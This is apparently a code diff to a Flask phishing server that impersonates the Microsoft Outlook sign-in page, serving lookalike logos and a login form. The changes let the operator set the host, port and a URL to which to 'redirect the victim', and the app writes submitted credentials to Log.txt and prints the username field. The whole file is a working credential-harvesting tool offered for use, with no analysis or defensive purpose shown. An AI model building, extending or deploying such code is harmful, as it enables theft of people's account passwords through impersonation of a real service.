@@ -1,17 +1,22 @@
 from flask import Flask, request, render_template, send_file, redirect
 from werkzeug.datastructures import RequestCacheControl
+import os
 
-
-
-
+url = input("Enter url to redirect the victim: ")
+host= input("enter host: ")
+port= input('enter port[default is 80]: ')
+if port=="":
+    port= 80
+else:
+    port=int(port)
 app = Flask(__name__)
-@app.route("/login")
+@app.route("/")
 def hell():
     return render_template("email.html")
 
 
 
-@app.route("/login" , methods=["POST"])
+@app.route("/" , methods=["POST"])
 def passwd():
     data = request.form.to_dict(flat=False)
     print(data["loginfmt"])
@@ -19,9 +24,9 @@ def passwd():
 @app.route("/login.php" , methods=["POST", "GET"])
 def reorient():
     data = request.form.to_dict(flat=False)
-    with open("Log\Log.txt" , "a") as file:
+    with open("Log.txt" , "a") as file:
        file.write(f"{list(data.keys())[0]} : {data[list(data.keys())[0]][0]}\n")
-    return redirect("office.com/?auth=2")
+    return redirect(url)
 
 @app.route("/templates/Sign in to Outlook_files/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg")
 def Logo1():
@@ -57,4 +62,4 @@ def Logo8():
     return send_file("templates\\index_files\\microsoft_logo.svg")
 
 
-app.run()
+app.run(host=host, port=port)
